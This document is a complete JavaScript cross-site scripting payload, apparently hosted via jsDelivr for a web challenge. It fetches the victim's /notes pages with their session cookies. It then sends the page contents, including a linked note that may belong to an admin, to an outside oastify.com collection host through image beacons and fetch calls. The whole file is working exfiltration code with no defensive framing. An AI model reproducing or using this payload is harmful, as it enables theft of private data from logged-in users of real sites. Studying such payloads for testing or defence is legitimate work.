// payload.js — hosted on GitHub, served via jsDelivr
(async function(){
  try {
    // 1) fetch listing (could be /notes or specific ID)
    const res = await fetch('/notes', { credentials: 'include' }); // ensure cookies sent
    const text = await res.text();

    // 2) send content to OAST (use GET so it will be logged in Collaborator)
    // we URL-encode to keep it in one query param (note: long data may be truncated — can chunk or POST to another server if needed)
    const beaconUrl = 'https://m6t0wfu6amhk72tg37oqazpkkbq2es2h.oastify.com/collect?d=' + encodeURIComponent(text.slice(0, 30000));
    // Try image approach (works even with CSP img-src * allowed)
    new Image().src = beaconUrl;

    // Also try fetch to be thorough (if egress allowed)
    fetch(beaconUrl).catch(()=>{});

    // Optional: if you want specific note content, try to parse and fetch /notes/<id> too
    // e.g., find link to admin note in text and fetch it (example naive)
    const match = text.match(/href="\/notes\/(\d+)"/);
    if (match) {
      const id = match[1];
      const r2 = await fetch('/notes/' + id, { credentials: 'include' });
      const t2 = await r2.text();
      new Image().src = 'https://m6t0wfu6amhk72tg37oqazpkkbq2es2h.oastify.com/collect2?d=' + encodeURIComponent(t2.slice(0,30000));
    }
  } catch(e) {
    // report error to OAST too
    try { new Image().src = 'https://m6t0wfu6amhk72tg37oqazpkkbq2es2h.oastify.com/error?e=' + encodeURIComponent(String(e)); } catch(e){}
  }
})();
